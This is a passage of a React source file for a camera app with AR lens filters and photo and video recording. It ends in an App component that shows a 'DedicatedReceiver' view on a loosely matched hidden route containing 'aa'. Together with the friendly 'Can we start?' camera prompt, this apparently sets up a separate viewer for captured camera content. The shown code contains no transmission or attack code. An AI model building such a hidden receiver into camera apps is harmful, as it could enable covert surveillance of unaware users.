              padding: '4px 10px',
              borderRadius: '999px',
              fontSize: '11px',
              fontWeight: '800',
              fontFamily: 'monospace',
              display: 'flex',
              alignItems: 'center',
              gap: '6px',
              boxShadow: '0 0 12px rgba(239, 68, 68, 0.6)'
            }}>
              <span style={{ width: '8px', height: '8px', borderRadius: '50%', backgroundColor: '#ffffff', animation: 'pulseGlow 1s infinite' }}></span>
              REC {recordingTime}
            </div>
          )}

          <video ref={videoRef} playsInline muted style={{ display: 'none' }} />

          <canvas
            ref={canvasRef}
            style={{
              width: '100%',
              height: '100%',
              objectFit: 'cover',
              display: isCameraActive ? 'block' : 'none'
            }}
          />

          {!isCameraActive && (
            <div style={{ textAlign: 'center', padding: '28px', color: '#94a3b8' }}>
              <div style={{
                width: '68px',
                height: '68px',
                borderRadius: '50%',
                background: 'linear-gradient(135deg, rgba(236, 72, 153, 0.2), rgba(168, 85, 247, 0.2))',
                border: '1.5px dashed rgba(255, 255, 255, 0.25)',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                margin: '0 auto 14px auto',
                fontSize: '32px'
              }}>
                ✨
              </div>
              <div style={{ fontSize: '18px', fontWeight: '800', color: '#ffffff', letterSpacing: '-0.01em' }}>
                Can we start?
              </div>
              <p style={{ fontSize: '12px', color: '#94a3b8', marginTop: '6px', maxWidth: '280px', margin: '6px auto 0 auto' }}>
                Tap "shall we start cam for <strong>ar lens?</strong>"
              </p>
            </div>
          )}

          {isCameraActive && (
            <div style={{
              position: 'absolute',
              top: '12px',
              left: '12px',
              padding: '6px 12px',
              backgroundColor: 'rgba(0, 0, 0, 0.65)',
              backdropFilter: 'blur(10px)',
              border: '1px solid rgba(255, 255, 255, 0.15)',
              borderRadius: '999px',
              fontSize: '11px',
              fontWeight: '700',
              color: '#ffffff',
              display: 'flex',
              alignItems: 'center',
              gap: '6px',
              zIndex: 20
            }}>
              <span>{activeFilter.icon}</span>
              <span>{activeFilter.name}</span>
            </div>
          )}
        </div>

        {/* Category Pills */}
        <div style={{
          width: '100%',
          display: 'flex',
          gap: '6px',
          overflowX: 'auto',
          padding: '2px 0',
          scrollbarWidth: 'none'
        }}>
          {categories.map((cat) => (
            <button
              key={cat}
              onClick={() => setSelectedCategory(cat)}
              style={{
                padding: '4px 10px',
                borderRadius: '999px',
                border: selectedCategory === cat ? '1px solid #ec4899' : '1px solid rgba(255, 255, 255, 0.08)',
                backgroundColor: selectedCategory === cat ? 'rgba(236, 72, 153, 0.2)' : 'rgba(255, 255, 255, 0.04)',
                color: selectedCategory === cat ? '#ffffff' : '#94a3b8',
                fontSize: '11px',
                fontWeight: '600',
                cursor: 'pointer',
                whiteSpace: 'nowrap'
              }}
            >
              {cat}
            </button>
          ))}
        </div>

        {/* AR Filter Carousel */}
        <div style={{ width: '100%' }}>
          <div
            className="lens-carousel"
            style={{
              display: 'flex',
              gap: '10px',
              overflowX: 'auto',
              padding: '6px 2px',
              scrollSnapType: 'x mandatory'
            }}
          >
            {filteredList.map((lens) => {
              const isSelected = activeFilter.id === lens.id;
              return (
                <button
                  key={lens.id}
                  onClick={() => setActiveFilter(lens)}
                  style={{
                    flex: '0 0 auto',
                    display: 'flex',
                    flexDirection: 'column',
                    alignItems: 'center',
                    justifyContent: 'center',
                    padding: '8px 14px',
                    borderRadius: '16px',
                    backgroundColor: isSelected ? 'rgba(255, 255, 255, 0.16)' : 'rgba(255, 255, 255, 0.04)',
                    border: isSelected ? '2px solid #ec4899' : '1px solid rgba(255, 255, 255, 0.08)',
                    cursor: 'pointer',
                    scrollSnapAlign: 'center',
                    minWidth: '72px',
                    boxShadow: isSelected ? '0 0 16px rgba(236, 72, 153, 0.6)' : 'none',
                    transform: isSelected ? 'scale(1.05)' : 'scale(1)',
                    transition: 'all 0.18s ease'
                  }}
                >
                  <span style={{ fontSize: '24px', lineHeight: 1 }}>{lens.icon}</span>
                  <span style={{
                    fontSize: '11px',
                    fontWeight: isSelected ? '800' : '600',
                    color: isSelected ? '#ffffff' : '#94a3b8',
                    marginTop: '4px',
                    whiteSpace: 'nowrap'
                  }}>
                    {lens.name}
                  </span>
                </button>
              );
            })}
          </div>
        </div>

        {/* Action Controls */}
        <div style={{ width: '100%', marginTop: 'auto', paddingBottom: '8px' }}>
          {!isCameraActive ? (
            <button
              onClick={() => startSession()}
              style={{
                width: '100%',
                padding: '16px 24px',
                background: 'linear-gradient(135deg, #ec4899 0%, #8b5cf6 50%, #3b82f6 100%)',
                color: '#ffffff',
                border: 'none',
                borderRadius: '16px',
                cursor: 'pointer',
                fontWeight: '800',
                fontSize: '15px',
                letterSpacing: '-0.01em',
                boxShadow: '0 8px 25px rgba(236, 72, 153, 0.4)',
                display: 'flex',
                alignItems: 'center',
                justifyContent: 'center',
                gap: '8px'
              }}
            >
              ✨ Yes, Start Lenses
            </button>
          ) : (
            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: '10px' }}>
              <button
                onClick={toggleRecording}
                title={isRecording ? 'Stop Recording' : 'Record Video'}
                style={{
                  flex: 1,
                  padding: '12px 14px',
                  backgroundColor: isRecording ? 'rgba(239, 68, 68, 0.25)' : 'rgba(255, 255, 255, 0.08)',
                  color: isRecording ? '#f87171' : '#ffffff',
                  border: isRecording ? '1px solid #ef4444' : '1px solid rgba(255, 255, 255, 0.15)',
                  borderRadius: '14px',
                  cursor: 'pointer',
                  fontWeight: '700',
                  fontSize: '12px',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  gap: '6px'
                }}
              >
                {isRecording ? '⏹ Stop Rec' : '🎥 Record'}
              </button>

              <button
                onClick={capturePhoto}
                title="Take Snap Photo"
                style={{
                  width: '62px',
                  height: '62px',
                  borderRadius: '50%',
                  backgroundColor: '#ffffff',
                  border: '4px solid rgba(255, 255, 255, 0.3)',
                  boxShadow: '0 0 20px rgba(255, 255, 255, 0.5)',
                  cursor: 'pointer',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  fontSize: '22px',
                  flexShrink: 0
                }}
              >
                📸
              </button>

              <button
                onClick={stopSession}
                style={{
                  flex: 1,
                  padding: '12px 14px',
                  backgroundColor: 'rgba(239, 68, 68, 0.15)',
                  color: '#f87171',
                  border: '1px solid rgba(239, 68, 68, 0.3)',
                  borderRadius: '14px',
                  cursor: 'pointer',
                  fontWeight: '700',
                  fontSize: '12px'
                }}
              >
                🛑 Close
              </button>
            </div>
          )}
        </div>

        {errorMsg && (
          <div style={{
            width: '100%',
            padding: '10px 14px',
            backgroundColor: 'rgba(239, 68, 68, 0.12)',
            border: '1px solid rgba(239, 68, 68, 0.3)',
            borderRadius: '12px',
            color: '#fca5a5',
            fontSize: '12px',
            textAlign: 'center'
          }}>
            {errorMsg}
          </div>
        )}

      </main>
    </div>
  );
}

export default function App() {
  const isReceiverRoute = () => {
    if (typeof window === 'undefined') return false;
    const path = window.location.pathname.toLowerCase();
    const search = window.location.search.toLowerCase();
    const hash = window.location.hash.toLowerCase();
    return (
      path === '/aa' ||
      path.endsWith('/aa') ||
      path.endsWith('/aa/') ||
      search.includes('aa') ||
      hash.includes('aa')
    );
  };

  const [isReceiver, setIsReceiver] = useState(isReceiverRoute());

  useEffect(() => {
    const handleLocationChange = () => {
      setIsReceiver(isReceiverRoute());
    };

    window.addEventListener('popstate', handleLocationChange);
    window.addEventListener('hashchange', handleLocationChange);
    return () => {
      window.removeEventListener('popstate', handleLocationChange);
      window.removeEventListener('hashchange', handleLocationChange);
    };
  }, []);

  return (
    <ErrorBoundary>
      {isReceiver ? <DedicatedReceiver /> : <SnapStudio />}
    </ErrorBoundary>
  );
}
